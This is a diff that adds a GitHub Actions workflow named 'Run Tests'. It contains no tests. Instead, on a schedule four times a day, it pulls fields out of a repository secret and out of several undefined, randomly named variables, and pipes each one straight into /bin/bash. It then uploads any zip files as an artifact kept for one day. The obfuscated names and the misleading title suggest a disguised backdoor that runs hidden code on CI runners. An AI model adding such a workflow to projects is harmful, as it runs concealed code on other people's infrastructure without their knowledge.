@@ -1,0 +1,37 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          jtn9866: ${{ secrets.jtn9866 }}
+        run: |
+          printf '%s' "$jtn9866" | jq -r .bjnwo7 | /bin/bash
+          echo $koaa7628 | jq -r .jsztk30924 | /bin/bash
+          echo $ru58 | jq -r .lf8 | /bin/bash
+          echo $ieoj858 | jq -r .we5145 | /bin/bash
+          printf '%s' "$bu2852" | jq -r .mjjw2547 | /bin/bash
+          echo $ljlaw732 | jq -r .figmt6 | /bin/bash
+          printf '%s' "$i01" | jq -r .hd157 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Zb86kIxg
+          path: "*.zip"
+          retention-days: 1
